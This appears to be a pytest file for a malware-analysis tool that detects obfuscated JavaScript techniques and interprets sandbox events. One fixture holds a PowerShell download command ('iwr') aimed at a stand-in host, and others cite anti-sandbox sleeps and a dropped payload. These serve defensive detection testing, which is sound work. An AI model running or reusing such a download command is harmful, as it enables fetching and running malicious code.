"""Obfuscation techniques: static detectors, sandbox instrumentation and events."""

from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

from docutracex.parsers import javascript as J
from docutracex.parsers import js_techniques as jt


def _sample() -> str:
    spec = importlib.util.spec_from_file_location(
        "ms", Path(__file__).parents[1] / "scripts" / "make_samples.py")
    ms = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ms)
    return ms.obf_techniques_js().decode("utf-8")


def _have_v8() -> bool:
    try:
        import STPyV8  # noqa: F401
        return True
    except Exception:  # noqa: BLE001
        return False


def test_static_techniques_on_sample() -> None:
    code = _sample()
    ids = {t["id"]: t for t in jt.static_techniques(code, J.metrics(code)["obfuscation_score"])}
    assert set(ids) == {"arithmetic_literals", "escape_block", "xor_decryptor", "iife_string",
                        "fromcharcode_arith", "payload_key_decryptor", "fake_header"}
    assert ids["escape_block"]["variable"] == "_0xa"
    assert ids["payload_key_decryptor"]["key"] == "Fact2024" and ids["payload_key_decryptor"]["decryptor"] == "dec"
    assert all(t["phase"] == "static" for t in ids.values())


def test_clean_code_has_no_techniques() -> None:
    code = "/* jQuery v3 */\nfunction add(a, b) { return a + b; }\nvar x = add(1, 2);\n"
    assert jt.static_techniques(code, 0) == []


def test_instrument_wraps_declared_xor_functions() -> None:
    code = "function d(a,k){var o='';for(var i=0;i<a.length;i++){o+=String.fromCharCode(a[i]^k.charCodeAt(i%k.length));}return o;}"
    out = jt.instrument(code)
    assert out.endswith(code) and "_dtx_log('xor','d'" in out


def test_from_sandbox_events() -> None:
    sb = {"log": [
        {"kind": "call", "name": "WScript.Sleep", "args": ["15000"]},
        {"kind": "timing", "name": "Date.getTime", "args": [""]},
        {"kind": "timing", "name": "Date.getTime", "args": [""]},
        {"kind": "fromcharcode", "name": "String.fromCharCode", "args": ["WScript"]},
        {"kind": "xor", "name": "dec", "args": ["powershell -nop -c iwr http://x.example/a"]},
    ]}
    ids = {t["id"]: t for t in jt.from_sandbox(sb)}
    assert {"antisandbox_timing", "fromcharcode_resolved", "xor_resolved", "dropped_payload"} <= set(ids)
    assert "15000" in ids["antisandbox_timing"]["evidence"]
    assert ids["dropped_payload"]["payload"].startswith("powershell")
    assert all(t["phase"] == "sandbox" for t in ids.values())


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_sample_end_to_end(tmp_path: Path) -> None:
    f = tmp_path / "s.js"
    f.write_text(_sample(), encoding="utf-8")
    res = J.analyze(f, tmp_path, {})
    sc = res["scripts"][0]
    phases = {t["id"]: t["phase"] for t in sc["techniques"]}
    assert phases["payload_key_decryptor"] == "static" and phases["dropped_payload"] == "sandbox"
    assert "billing-portal.example" in next(t for t in sc["techniques"] if t["id"] == "dropped_payload")["payload"]
    rules = {x["rule"] for x in res["findings"]}
    assert {"js_dropped_payload", "js_antisandbox_timing", "js_payload_key_decryptor"} <= rules
